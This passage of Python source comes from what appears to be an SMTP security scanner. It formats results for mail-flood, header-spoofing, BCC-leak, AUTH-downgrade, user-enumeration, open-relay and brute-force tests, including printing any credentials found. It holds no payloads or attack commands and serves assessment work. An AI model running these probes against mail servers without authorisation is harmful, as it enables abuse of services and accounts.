                f"(includes connection failures, non-250 after DATA, and errors before DATA completion)",
                Out.TEXT,
            )
            self.ptprint(
                f"    {info_icon} Delivered: {fr.messages_accepted} "
                f"(successful DATA accepted by server, 250 OK)",
                Out.TEXT,
            )
            self.ptprint(
                f"    {info_icon} DATA completed (no TCP error): {fr.messages_sent}",
                Out.TEXT,
            )
        else:
            self.ptprint(
                f"    {info_icon} Queue stress: skipped (no recipient or no attempts)",
                Out.TEXT,
            )
        for line in queue_lines[-25:]:
            self.ptprint(f"        {line}", Out.TEXT)
        if fr.tarpitting_detected:
            self.ptprint(f"    {info_icon} Tarpitting detected (defensive slowdown)", Out.TEXT)

        self.ptprint(f"    {info_icon} Summary", Out.TEXT)
        if fr.detail:
            self.ptprint(f"        {fr.detail}", Out.TEXT)
        if fr.vulnerable and fr.flood_notes:
            self.ptprint(
                f"    {info_icon} Vulnerability based on missing SIZE limit, not delivery ratio",
                Out.TEXT,
            )
        self.ptprint(f"        Elapsed: {fr.elapsed_sec:.1f} s", Out.TEXT)

        if fr.vulnerable:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} VULNERABLE", Out.TEXT)
            if fr.flood_notes:
                warn_icon = get_colored_text("[!]", color="WARNING")
                self.ptprint(f"    {warn_icon} {fr.flood_notes[0]}", Out.TEXT)
                self.ptprint(f"    {info_icon} {fr.flood_notes[1]}", Out.TEXT)
        elif fr.partial_protection:
            warn_icon = get_colored_text("[!]", color="WARNING")
            self.ptprint(f"    {warn_icon} PARTIAL PROTECTION", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} NOT VULNERABLE", Out.TEXT)

    def _stream_zipxxe_result(self) -> None:
        if (err := self.results.zipxxe_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} ZIPXXE test failed: {err}", Out.TEXT)
            return
        zr = self.results.zipxxe
        if zr is None:
            return
        if self.use_json:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        manual_icon = get_colored_text("[?]", color="WARNING")
        if zr.canary_url:
            self.ptprint(f"    {info_icon} Canary URL: {zr.canary_url}", Out.TEXT)
        for v in zr.variants:
            self.ptprint(
                f"    {info_icon} {v.variant}: {v.accepted} accepted, {v.rejected} rejected, {v.error} error",
                Out.TEXT,
            )
            for line in v.smtp_trace[-10:]:
                self.ptprint(f"        {line}", Out.TEXT)
        self.ptprint(f"    {info_icon} Summary", Out.TEXT)
        if zr.detail:
            self.ptprint(f"        {zr.detail}", Out.TEXT)
        if zr.all_rejected_at_rcpt:
            self.ptprint(
                f"    {info_icon} All variants rejected at RCPT phase — "
                "content-level protection could not be assessed",
                Out.TEXT,
            )
        instr = (zr.verification_instructions or "").strip()
        if instr:
            wrapped_lines = textwrap.wrap(instr, width=80)
            self.ptprint(f"    {info_icon} {wrapped_lines[0]}", Out.TEXT)
            for line in wrapped_lines[1:]:
                self.ptprint(f"        {line}", Out.TEXT)
        self.ptprint(f"    Elapsed: {zr.elapsed_sec:.1f} s", Out.TEXT)
        self.ptprint(
            f"    {manual_icon} MANUAL VERIFICATION REQUIRED — monitor server load and canary (XXE)",
            Out.TEXT,
        )

    def _stream_spoof_header_result(self) -> None:
        if (err := self.results.spoof_header_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Spoof header test failed: {err}", Out.TEXT)
            return
        sh = self.results.spoof_header
        if sh is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        if not self.use_json:
            for v in sh.variants:
                self.ptprint(f"    {info_icon} {v.variant}: {v.detail or ''}", Out.TEXT)
                if v.envelope_header_mismatch and v.accepted:
                    warn_icon = get_colored_text("[!]", color="WARNING")
                    self.ptprint(
                        f"    {warn_icon} Rozpor obálka vs. hlavička: MAIL FROM (obálka) ≠ From (hlavička) – server akceptoval",
                        Out.TEXT,
                    )
            self.ptprint(f"    {info_icon} {sh.detail}", Out.TEXT)
            if sh.vulnerable and sh.vulnerable_note:
                self.ptprint(f"    {info_icon} {sh.vulnerable_note}", Out.TEXT)
            self.ptprint(f"    {info_icon} Elapsed: {sh.elapsed_sec:.1f} s", Out.TEXT)
        if sh.indeterminate:
            self.ptprint(f"    {info_icon} Indeterminate: {sh.detail or 'Could not complete'}", Out.TEXT)
        elif sh.vulnerable:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} VULNERABLE", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} SECURE", Out.TEXT)

    def _stream_bcc_result(self) -> None:
        if (err := self.results.bcc_test_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} BCC test failed: {err}", Out.TEXT)
            return
        bc = self.results.bcc_test
        if bc is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        warn_icon = get_colored_text("[!]", color="WARNING")
        ok_icon = get_colored_text("[✓]", color="NOTVULN")
        vuln_icon = get_colored_text("[✗]", color="VULN")
        manual_icon = get_colored_text("[?]", color="INFO")
        if not self.use_json:
            self.ptprint("    [*] Sending test email...", Out.TEXT)
            mail_from = self.args.mail_from or f"bcctest@{self.fqdn}"
            self.ptprint(f"    {info_icon} From: {mail_from}", Out.TEXT)
            for r in bc.recipients_to:
                self.ptprint(f"    {info_icon} To: {r}", Out.TEXT)
            for r in bc.recipients_cc:
                self.ptprint(f"    {info_icon} Cc: {r}", Out.TEXT)
            for r in bc.recipients_bcc:
                self.ptprint(f"    {info_icon} Bcc: {r}", Out.TEXT)
            if bc.message_accepted:
                self.ptprint("    " + warn_icon + " Message sent successfully.", Out.TEXT)
                self.ptprint("", Out.TEXT)
                self.ptprint(f"    {manual_icon} MANUAL VERIFICATION REQUIRED:", Out.TEXT)
                to_cc = list(bc.recipients_to) + list(bc.recipients_cc)
                to_cc_str = ", ".join(to_cc[:2]) if to_cc else "To/Cc"
                if bc.recipients_bcc:
                    bcc_example = bc.recipients_bcc[0]
                else:
                    bcc_example = "Bcc"
                self.ptprint(f"    1. Log in to {to_cc_str} (To/Cc).", Out.TEXT)
                self.ptprint('    2. View "Message Source" / "Original Header".', Out.TEXT)
                self.ptprint(f'    3. SEARCH for the string "Bcc" or "{bcc_example}".', Out.TEXT)
                self.ptprint("", Out.TEXT)
                self.ptprint(f"    {ok_icon} If NOT FOUND: SECURE (Server correctly stripped BCC).", Out.TEXT)
                self.ptprint(f"    {vuln_icon} If FOUND: VULNERABLE (BCC disclosure).", Out.TEXT)
            else:
                self.ptprint(f"    {info_icon} {bc.detail or 'Message not accepted.'}", Out.TEXT)
            self.ptprint(f"    {info_icon} Elapsed: {bc.elapsed_sec:.1f} s", Out.TEXT)

    def _stream_alias_result(self) -> None:
        if (err := self.results.alias_test_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Alias test failed: {err}", Out.TEXT)
            return
        al = self.results.alias_test
        if al is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        warn_icon = get_colored_text("[!]", color="WARNING")
        if not self.use_json:
            self.ptprint(f"    {info_icon} Base recipient: {al.base_address}", Out.TEXT)
            self.ptprint("", Out.TEXT)
            for v in al.variants:
                status_str = f"[{v.smtp_status}]" if v.smtp_status is not None else "[?]"
                reply_snippet = (v.smtp_reply or "").strip()
                line = f"    {info_icon} Variant '{v.variant}' ({v.address}): {status_str}"
                if v.accepted:
                    line += " OK"
                    if v.uucp_warning:
                        line += " (Warning: UUCP syntax accepted)"
                elif v.rejected and reply_snippet:
                    line += f" {reply_snippet}"
                elif v.detail:
                    line += f" {v.detail}"
                self.ptprint(line, Out.TEXT)
            self.ptprint("", Out.TEXT)
            self.ptprint(f"    {warn_icon} MANUAL TASK:", Out.TEXT)
            self.ptprint("    Verify if messages sent to '250 OK' addresses bypassed any security", Out.TEXT)
            self.ptprint("    policies (rate limits, attachment filtering, content scanning).", Out.TEXT)
            self.ptprint("", Out.TEXT)
            self.ptprint(f"    {info_icon} Elapsed: {al.elapsed_sec:.1f} s", Out.TEXT)

    def _stream_auth_downgrade_result(self) -> None:
        if (err := self.results.auth_downgrade_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} AUTH downgrade test failed: {err}", Out.TEXT)
            return
        ad = self.results.auth_downgrade
        if ad is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        warn_icon = get_colored_text("[!]", color="WARNING")
        if not self.use_json:
            self.ptprint(f"    {info_icon} Initial methods: {ad.methods_before}", Out.TEXT)
            self.ptprint(f"    {info_icon} Attempting failed AUTH ({ad.auth_method_used})...", Out.TEXT)
            if ad.server_response:
                self.ptprint(f"    {info_icon} Server response: {ad.server_response}", Out.TEXT)
            if ad.rset_ok is not None:
                self.ptprint(f"    {info_icon} Resetting session state (RSET)...", Out.TEXT)
                if ad.rset_ok:
                    ok_icon = get_colored_text("[✓]", color="NOTVULN")
                    self.ptprint(f"    {ok_icon} RSET OK", Out.TEXT)
                    self.ptprint(f"    {info_icon} Post-failure methods: {ad.methods_after}", Out.TEXT)
                else:
                    self.ptprint(f"    {warn_icon} Connection closed after RSET", Out.TEXT)
            elif ad.methods_after:
                self.ptprint(f"    {info_icon} Post-failure methods: {ad.methods_after}", Out.TEXT)
        if ad.indeterminate:
            self.ptprint(f"    {info_icon} Indeterminate: {ad.detail or 'Could not determine'}", Out.TEXT)
            return
        if ad.info_defensive:
            self.ptprint(f"    {info_icon} {ad.detail}", Out.TEXT)
            return
        if ad.vulnerable:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} VULNERABLE: {ad.detail}", Out.TEXT)
            self.ptprint(f"        Before: {ad.methods_before}", Out.TEXT)
            self.ptprint(f"        After:  {ad.methods_after}", Out.TEXT)
            self.ptprint(f"    {info_icon} Risk: Server may be susceptible to forced credential sniffing.", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} {ad.detail}", Out.TEXT)

    def _stream_max_connections_result(self) -> None:
        if (max_connections_error := self.results.max_connections_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Max connections test failed: {max_connections_error}", Out.TEXT)
            return
        max_con = self.results.max_connections
        if max_con is None:
            return
        if max_con.max is None:
            self.ptprint("Maximum connections: no limit found", Out.VULN)
            return
        if max_con.max < 50:
            icon = get_colored_text("[✓]", color="NOTVULN")
            status_text = ""
        elif max_con.max < 100:
            icon = get_colored_text("[!]", color="WARNING")
            status_text = " (high value)"
        else:
            icon = get_colored_text("[✗]", color="VULN")
            status_text = " (high value)"
        self.ptprint(f"    {icon} Max connections per IP: {max_con.max}{status_text}", Out.TEXT)
        if max_con.ban_minutes is None:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} Timeout: not detected", Out.TEXT)
        else:
            if max_con.ban_minutes < 10:
                icon = get_colored_text("[✓]", color="NOTVULN")
                status_text = ""
            else:
                icon = get_colored_text("[✗]", color="VULN")
                status_text = " (high value)"
            self.ptprint(f"    {icon} Timeout: {max_con.ban_minutes:.1f} min{status_text}", Out.TEXT)

    def _on_brute_success(self, cred: Creds) -> None:
        """Callback for real-time streaming of found credentials (thread-safe)."""
        with self._brute_stream_lock:
            self.ptprint(f"    user: {cred.user}, password: {cred.passw}")

    def _stream_brute_result(self) -> None:
        creds = self.results.creds
        if creds is None:
            return
        if not self.use_json and len(creds) > 0:
            self.ptprint(f"    Found {len(creds)} valid credentials", Out.INFO)

    # endregion

    # region output

    def _is_node_based_output(self) -> bool:
        """Node-based tests: run_all, banner, enumerate, bruteforce."""
        if getattr(self, "run_all_mode", False):
            return True
        if self.results.banner_requested:
            return True
        if self.results.enum_results is not None or self.results.enum_error is not None:
            return True
        if self.results.creds is not None:
            return True
        return False

    def _is_enum_only_output(self) -> bool:
        """Enumeration-only: no software node, just userAccount nodes + global vulns."""
        if getattr(self, "run_all_mode", False):
            return False
        if self.results.banner_requested:
            return False
        if self.results.commands_requested:
            return False
        if self.results.creds is not None:
            return False
        if self.results.ntlm is not None or self.results.ntlm_error is not None:
            return False
        return self.results.enum_results is not None or self.results.enum_error is not None

    @staticmethod
    def _ehlo_commands_for_flat(ehlo_raw: str | None, ehlo_starttls_raw: str | None) -> list[str]:
        """Extract EHLO extension names (excluding AUTH methods) for flat JSON description."""
        seen: set[tuple[str, bool]] = set()
        result: list[str] = []
        for raw, encrypted in ((ehlo_raw, False), (ehlo_starttls_raw, True)):
            if not raw:
                continue
            for display, _level in _parse_ehlo_commands(raw, connection_encrypted=encrypted):
                key = display.split()[0].upper() if display else ""
                if key == "AUTH":
                    continue
                if (display, encrypted) not in seen:
                    seen.add((display, encrypted))
                    label = "(STARTTLS) " if encrypted and ehlo_raw else ""
                    result.append(f"{label}{display}")
        return result

    @staticmethod
    def _ehlo_auth_for_flat(ehlo_raw: str | None, ehlo_starttls_raw: str | None) -> list[str]:
        """Extract AUTH methods only for flat JSON description (same format as commands)."""
        seen: set[tuple[str, bool]] = set()
        result: list[str] = []
        for raw, encrypted in ((ehlo_raw, False), (ehlo_starttls_raw, True)):
            if not raw:
                continue
            for display, _level in _parse_ehlo_commands(raw, connection_encrypted=encrypted):
                key = display.split()[0].upper() if display else ""
                if key != "AUTH":
                    continue
                if (display, encrypted) not in seen:
                    seen.add((display, encrypted))
                    label = "(STARTTLS) " if encrypted and ehlo_raw else ""
                    result.append(f"{label}{display}")
        return result

    def _build_flat_description(self) -> str:
        """Build description string for flat (non-node) JSON output."""
        parts: list[str] = []

        if (ic_err := self.results.inv_comm_error) is not None:
            return f"Invalid commands test error: {ic_err}"
        if (ic := self.results.inv_comm) is not None:
            return ic.detail or "Invalid commands test"
        if (ho_err := self.results.helo_only_error) is not None:
            return f"HELO-only test error: {ho_err}"
        if (ho := self.results.helo_only) is not None:
            return ho.detail or "HELO-only test"
        if (hb_err := self.results.helo_bypass_error) is not None:
            return f"HELO bypass test error: {hb_err}"
        if (hb := self.results.helo_bypass) is not None:
            return hb.detail or "HELO bypass test"
        if (id_err := self.results.identify_error) is not None:
            return f"Server identification error: {id_err}"
        if (id_r := self.results.identify) is not None:
            return f"Server identification: {id_r.product or 'Unknown'} ({id_r.confidence_pct}%)"
        if (br_err := self.results.bounce_replay_error) is not None:
            return f"Bounce replay test error: {br_err}"
        if (br := self.results.bounce_replay) is not None:
            return br.detail or "Bounce replay test"
        if (mb_err := self.results.mail_bomb_error) is not None:
            return f"Mail bomb test error: {mb_err}"
        if (mb := self.results.mail_bomb) is not None:
            return mb.detail or "Mail bomb / rate limiting test (PTL-SVC-SMTP-BOMB)"
        if (av_err := self.results.antivirus_error) is not None:
            return f"Antivirus test error: {av_err}"
        if (av := self.results.antivirus) is not None:
            return av.detail or "Antivirus / antispam test (PTL-SVC-SMTP-ANTIVIRUS)"
        if (sh_err := self.results.spoof_header_error) is not None:
            return f"Spoof header test error: {sh_err}"
        if (sh := self.results.spoof_header) is not None:
            return sh.detail or "Header spoofing test"
        if (bc_err := self.results.bcc_test_error) is not None:
            return f"BCC test error: {bc_err}"
        if (bc := self.results.bcc_test) is not None:
            return bc.detail or "BCC disclosure test – manual verification required"
        if (al_err := self.results.alias_test_error) is not None:
            return f"Alias test error: {al_err}"
        if (al := self.results.alias_test) is not None:
            return al.detail or "Alias bypass test – manual verification required"
        if (ad_err := self.results.auth_downgrade_error) is not None:
            return f"AUTH downgrade test error: {ad_err}"
        if (ad := self.results.auth_downgrade) is not None:
            if ad.indeterminate:
                return ad.detail or "Indeterminate"
            if ad.info_defensive:
                return ad.detail or "AUTH disappeared (defensive reaction)"
            if ad.vulnerable:
                return ad.detail or f"Authentication downgrade: {ad.methods_before} -> {ad.methods_after}"
            return ad.detail or "No authentication downgrade detected"

        if (af_err := self.results.auth_format_error) is not None:
            return f"AUTH format probe error: {af_err}"
        if (af := self.results.auth_format) is not None:
            return f"{af.conclusion} [{af.conclusion_id}]"

        if (ae := self.results.auth_enum) is not None:
            if ae.indeterminate:
                return ae.detail or "Indeterminate"
            if ae.vulnerable:
                base = ae.detail or "User enumeration via AUTH without password knowledge"
                if ae.enumerated_users:
                    return f"{base}; enumerated: {', '.join(ae.enumerated_users)}"
                return base
            return "Server does not allow user enumeration via AUTH, or no valid/differentiated user in -u / -w"
        if self.results.auth_enum_error is not None:
            return f"AUTH enumeration error: {self.results.auth_enum_error}"

        if (hv := self.results.helo_validation) is not None:
            if hv.indeterminate:
                return hv.detail or "Indeterminate"
            parts_hv = [hv.detail or ""]
            if hv.accepted_vectors:
                parts_hv.append(f"accepted_vectors: {hv.accepted_vectors}")
            if hv.rejected_vectors:
                parts_hv.append(f"rejected_vectors: {hv.rejected_vectors}")
            if hv.ehlo_comparison:
                parts_hv.append(f"ehlo_comparison: {hv.ehlo_comparison}")
            return "\r\n".join(parts_hv)
        if self.results.helo_validation_error is not None:
            return f"HELO validation error: {self.results.helo_validation_error}"

        if self.results.authentications_requested:
            info = self.results.info
            if info is not None:
                auth_lines = self._ehlo_auth_for_flat(info.ehlo, info.ehlo_starttls)
                if auth_lines:
                    return "\r\n".join(auth_lines)
            return ""

        if self.results.commands_requested:
            info = self.results.info
            if info is not None:
                cmd_lines = self._ehlo_commands_for_flat(info.ehlo, info.ehlo_starttls)
                if cmd_lines:
                    parts.extend(cmd_lines)

        if (enc := self.results.encryption) is not None:
            method_names = []
            if enc.plaintext_ok:
                method_names.append("Plaintext")
            if enc.starttls_ok:
                method_names.append("STARTTLS")
            if enc.tls_ok:
                method_names.append("TLS")
            if method_names:
                parts.append(f"Available methods: {', '.join(method_names)}")

        if (role_r := self.results.role) is not None:
            parts.append(f"Identified role: {role_r.role}")
            if role_r.detail:
                parts.append(role_r.detail)
        elif (role_err := self.results.role_error) is not None:
            parts.append(f"Role error: {role_err}")

        if (rlim := self.results.rcpt_limit) is not None:
            if getattr(rlim, "rejected_addresses", False):
                parts.append(f"Server rejects test addresses: {rlim.server_response}")
                if getattr(rlim, "no_session_limit", False):
                    failed = getattr(rlim, "failed_before_limit", 0)
                    parts.append(f"No session error limit (allowed {failed} failed RCPTs without disconnect)")
            elif getattr(rlim, "session_limit_triggered", False):
                failed = getattr(rlim, "failed_before_limit", 0)
                parts.append(f"Session limit enforced after {failed} failed RCPTs")
            elif rlim.limit_triggered:
                parts.append(f"Per-message limit enforced after {rlim.max_accepted} recipients")
            else:
                if rlim.max_accepted == 0:
                    parts.append("Could not determine RCPT limit")
                else:
                    parts.append(f"No limit detected (tested {rlim.max_accepted} recipients)")
        elif (rcpt_err := self.results.rcpt_limit_error) is not None:
            parts.append(f"RCPT limit error: {rcpt_err}")

        if (open_relay := self.results.open_relay) is not None:
            pass  # description empty per JSON pattern (vuln code speaks for itself)
        elif (or_err := self.results.open_relay_error) is not None:
            parts.append(f"Open relay error: {or_err}")

        if (blacklist := self.results.blacklist) is not None:
            if blacklist.listed and (bl_results := blacklist.results):
                bl_lines = [f'{r.blacklist.strip()}: "{r.reason}" (TTL={r.ttl})' for r in bl_results]
                parts.append("\r\n".join(bl_lines))
            elif not blacklist.listed:
                parts.append("Not listed on any blacklist")
        elif self.results.blacklist_private_ip_skipped:
            parts.append("Blacklist check skipped (private IP)")

        if max_con := self.results.max_connections:
            con_parts = []
            if max_con.max is not None:
                con_parts.append(f"Max connections per IP: {max_con.max}")
            else:
                con_parts.append("Max connections per IP: not detected")
            if max_con.ban_minutes is not None:
                con_parts.append(f"Timeout: {max_con.ban_minutes} min")
            else:
                con_parts.append("Timeout: not detected")
            parts.append("\r\n".join(con_parts))
        elif (mc_err := self.results.max_connections_error) is not None:
            parts.append(f"Connections error: {mc_err}")

        if (ntlm := self.results.ntlm) is not None and ntlm.ntlm is not None:
            n = ntlm.ntlm
            ntlm_lines = [
                f"Target name: {n.target_name}",
                f"NetBios domain name: {n.netbios_domain}",
                f"NetBios computer name: {n.netbios_computer}",
                f"DNS domain name: {n.dns_domain}",
                f"DNS computer name: {n.dns_computer}",
                f"DNS tree: {n.dns_tree}",
                f"OS version: {n.os_version}",
            ]
            parts.append("\r\n".join(ntlm_lines))
        elif self.results.ntlm_error is not None:
            parts.append(f"NTLM error: {self.results.ntlm_error}")

        if self.results.spf_requires_domain:
            parts.append("SPF check requires domain name")
        elif (spf_records := self.results.spf_records) is not None:
            spf_lines = []
            for ns, records in spf_records.items():
                for r in records:
                    spf_lines.append(f"[{ns}] {r}")
            if spf_lines:
                parts.append("\r\n".join(spf_lines))

        return "\r\n".join(parts) if parts else ""

    def _collect_flat_vulns(self) -> list[dict]:
        """Collect global vulnerabilities for flat (non-node) JSON output."""
        vulns: list[dict] = []

        if self.results.authentications_requested:
            info = self.results.info
            if info is not None and info.ehlo:
                for display, level in _parse_ehlo_commands(info.ehlo, connection_encrypted=False):
                    if display.upper().startswith("AUTH ") and level == "ERROR":
                        vulns.append({"vuln_code": VULNS.AuthMethods.value})
                        break
            return vulns

        _CMD_VULN_MAP = {
            "ATRN": VULNS.CmdATRN.value,
            "DEBUG": VULNS.CmdDEBUG.value,
            "ETRN": VULNS.CmdETRN.value,
            "EXPN": VULNS.CmdEXPN.value,
            "SAML": VULNS.CmdSAML.value,
            "SEND": VULNS.CmdSEND.value,
            "SOML": VULNS.CmdSOML.value,
            "TURN": VULNS.CmdTURN.value,
            "VERB": VULNS.CmdVERB.value,
            "VRFY": VULNS.CmdVRFY.value,
        }
        if self.results.commands_requested:
            info = self.results.info
            seen_vuln_codes: set[str] = set()
            if info is not None:
                for raw, encrypted in ((info.ehlo, False), (info.ehlo_starttls, True)):
                    if not raw:
                        continue
                    for display, level in _parse_ehlo_commands(raw, connection_encrypted=encrypted):
                        key = display.split()[0].upper() if display else ""
                        if key == "AUTH":
                            continue
                        vc = _CMD_VULN_MAP.get(key)
                        if vc is None and key == "SIZE" and level == "ERROR":
                            vc = VULNS.BigSize.value
                        if vc is None and key == "STARTTLS" and "is not allowed" in display:
                            vc = VULNS.NoStarttls.value
                        if vc and vc not in seen_vuln_codes:
                            seen_vuln_codes.add(vc)
                            vulns.append({"vuln_code": vc})

        if (enc := self.results.encryption) is not None:
            if enc.plaintext_ok:
                vulns.append({"vuln_code": VULNS.CryptOnly.value})

        if (role_r := self.results.role) is not None:
            if role_r.role == "hybrid":
                vulns.append({"vuln_code": VULNS.HybridRole.value})

        if (rlim := self.results.rcpt_limit) is not None:
            if getattr(rlim, "no_session_limit", False):
                vulns.append({"vuln_code": VULNS.NoSessionLimit.value})
            elif rlim.limit_triggered and rlim.max_accepted is not None and rlim.max_accepted >= 100:
                vulns.append({"vuln_code": VULNS.ManyRcpt.value})

        if self.results.open_relay:
            vulns.append({"vuln_code": VULNS.OpenRelay.value})

        if (blacklist := self.results.blacklist) is not None:
            if blacklist.listed:
                vulns.append({"vuln_code": VULNS.Blacklist.value})

        if max_con := self.results.max_connections:
            if max_con.max is not None and max_con.max >= 50:
                vulns.append({"vuln_code": "PTV-SVC-SMTP-CONN"})

        if (ntlm := self.results.ntlm) is not None and ntlm.ntlm is not None:
            vulns.append({"vuln_code": VULNS.NTLM.value})

        if (ae := self.results.auth_enum) is not None and ae.vulnerable:
            ae_entry: dict = {"vuln_code": VULNS.UserEnumAUTH.value}
            if ae.enumerated_users:
                ae_entry["enumerated_users"] = list(ae.enumerated_users)
            vulns.append(ae_entry)

        if (ad := self.results.auth_downgrade) is not None and ad.vulnerable:
            vulns.append({"vuln_code": VULNS.AuthDowngrade.value})

        if (hv := self.results.helo_validation) is not None and (hv.vulnerable or hv.ehlo_bypass):
            vulns.append({"vuln_code": VULNS.HeloNoValidation.value})

        if (ic := self.results.inv_comm) is not None and ic.vulnerable:
            vulns.append({"vuln_code": VULNS.InvComm.value})

        if (ho := self.results.helo_only) is not None and ho.vulnerable:
            vulns.append({"vuln_code": VULNS.HeloOnly.value})

        if (hb := self.results.helo_bypass) is not None and hb.vulnerable:
            vulns.append({"vuln_code": VULNS.HeloBypass.value})

        if (br := self.results.bounce_replay) is not None and (
            br.message_accepted or getattr(br, "message_accepted_return_path", False)
        ):
            vulns.append({"vuln_code": VULNS.BounceReplay.value})

        if (mb := self.results.mail_bomb) is not None and mb.vulnerable:
            vulns.append(
                {
                    "vuln_code": VULNS.Bomb.value,
                    "vuln_request": f"Flood of {mb.sent} messages to {self.args.rcpt_to}",
                    "vuln_response": mb.detail or "",
                }
            )

        if (av := self.results.antivirus) is not None and av.vulnerable:
            vulns.append(
                {
                    "vuln_code": VULNS.Antivirus.value,
                    "vuln_request": f"E-mail with malicious content to {self.args.rcpt_to}",
                    "vuln_response": av.detail or "Risky content accepted at MTA",
                }
            )

        if (sh := self.results.spoof_header) is not None and sh.vulnerable:
            vulns.append(
                {
                    "vuln_code": VULNS.SpoofHeader.value,
                    "vuln_request": f"E-mail with spoofed From/Reply-To/Return-Path headers to {self.args.rcpt_to}",
                    "vuln_response": sh.detail or "Message accepted (250 OK) – server delivers spoofed headers",
                    "vuln_note": sh.vulnerable_note,
                }
            )

        return vulns

    def output(self) -> None:
        # Connection error: use unified error format (status=error, empty nodes)
        if (info_error := getattr(self.results, "info_error", None)) is not None:
            if self.use_json:
                self.ptjsonlib.end_error(info_error, self.use_json)
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} {info_error}", Out.TEXT)
            return

        # ── Flat output: no nodes, global properties + global vulnerabilities ──
        if not self._is_node_based_output():
            description = self._build_flat_description()
            flat_vulns = self._collect_flat_vulns()
            props: dict = {"description": description}
            if (ad := self.results.auth_downgrade) is not None:
                props["authDowngrade"] = {
                    "vulnerable": ad.vulnerable,
                    "weakness": ad.weakness,
                    "indeterminate": ad.indeterminate,
                    "infoDefensive": ad.info_defensive,
                    "methodsBefore": ad.methods_before,
                    "methodsAfter": ad.methods_after,
                    "authMethodUsed": ad.auth_method_used,
                    "detail": ad.detail,
                }
                if ad.server_response is not None:
                    props["authDowngrade"]["serverResponse"] = ad.server_response
                if ad.rset_ok is not None:
                    props["authDowngrade"]["rsetOk"] = ad.rset_ok
            elif (ad_err := self.results.auth_downgrade_error) is not None:
                props["authDowngradeError"] = ad_err
            if (af := self.results.auth_format) is not None:
                props["authFormat"] = {
                    "testId": "PTL-SVC-SMTP-AUTH-FORMAT",
                    "methodTested": af.method_tested,
                    "conclusion": af.conclusion,
                    "conclusionId": af.conclusion_id,
                    "targetDomainUsed": af.target_domain_used,
                    "targetDomainSource": af.target_domain_source,
                    "targetDomainAnalystNote": af.target_domain_analyst_note,
                    "targetDomainEhloHostname": af.target_domain_ehlo_hostname,
                    "targetDomainScanHostname": af.target_domain_scan_hostname,
                    "netbiosDomainUsed": af.netbios_domain_used,
                    "challengeDecoded": af.challenge_decoded,
                    "challengeHint": af.challenge_hint,
                    "rateLimited": af.rate_limited,
                    "indeterminate": af.indeterminate,
                    "probes": [
                        {
                            "id": r.probe_id,
                            "label": r.label,
                            "identity": r.identity,
                            "skipped": r.skipped,
                            "skipReason": r.skip_reason,
                            "codeAfterIdentity": r.code_after_identity,
                            "passwordPhase": r.password_phase,
                            "codeAfterPassword": r.code_after_password,
                            "replyAfterIdentity": r.reply_after_identity,
                            "rateLimited": r.rate_limited,
                        }
                        for r in af.rows
                    ],
                }
            elif (af_err := self.results.auth_format_error) is not None:
                props["authFormatError"] = af_err
            if (ic := self.results.inv_comm) is not None:
                props["invalidCommands"] = {
                    "vulnerable": ic.vulnerable,
                    "weakness": ic.weakness,
                    "indeterminate": ic.indeterminate,
                    "detail": ic.detail,
                    "baselineLatencySec": getattr(ic, "baseline_latency_sec", None),
                    "tarpittingDetected": getattr(ic, "tarpitting_detected", False),
                    "tests": [
                        {
                            "category": t.category,
                            "command": t.command_display,
                            "status": t.status,
                            "reply": t.reply,
                            "sessionOk": t.session_ok,
                            "infoLeak": t.info_leak,
                            "vulnerable": t.vulnerable,
                            "vulnType": getattr(t, "vuln_type", None),
                            "responseTimeSec": getattr(t, "response_time_sec", None),
                            "slowResponse": getattr(t, "slow_response", False),
                        }
                        for t in ic.tests
                    ],
                }
            elif (ic_err := self.results.inv_comm_error) is not None:
                props["invalidCommandsError"] = ic_err
            if (ho := self.results.helo_only) is not None:
                props["heloOnly"] = {
                    "vulnerable": ho.vulnerable,
                    "indeterminate": ho.indeterminate,
                    "heloStatus": ho.helo_status,
                    "ehloStatus": ho.ehlo_status,
                    "extensions": list(ho.extensions),
                    "connectionType": ho.connection_type,
                    "detail": ho.detail,
                }
            elif (ho_err := self.results.helo_only_error) is not None:
                props["heloOnlyError"] = ho_err
            if (hb := self.results.helo_bypass) is not None:
                props["heloBypass"] = {
                    "vulnerable": hb.vulnerable,
                    "indeterminate": hb.indeterminate,
                    "submissionBypassEhlo": list(hb.submission_bypass_ehlo),
                    "relayBypassEhlo": list(hb.relay_bypass_ehlo),
                    "acceptsInvalidFormat": list(hb.accepts_invalid_format),
                    "ehloConsistent": hb.ehlo_consistent,
                    "tarpittingDetected": list(hb.tarpitting_detected),
                    "rcptLatencies": hb.rcpt_latencies,
                    "detail": hb.detail,
                }
            elif (hb_err := self.results.helo_bypass_error) is not None:
                props["heloBypassError"] = hb_err
            if (id_r := self.results.identify) is not None:
                props["serverIdentify"] = {
                    "product": id_r.product,
                    "behavioralHint": getattr(id_r, "behavioral_hint", None),
                    "version": id_r.version,
                    "cpe": id_r.cpe,
                    "os": id_r.os,
                    "confidencePct": id_r.confidence_pct,
                    "confidenceLabel": id_r.confidence_label,
                    "hiddenBanner": id_r.hidden_banner,
                    "scoringMatrix": [
                        {"method": s.method, "points": s.points, "detail": s.detail}
                        for s in id_r.scoring_matrix
                    ],
                    "banner": id_r.banner,
                    "ehloExtensions": id_r.ehlo_extensions,
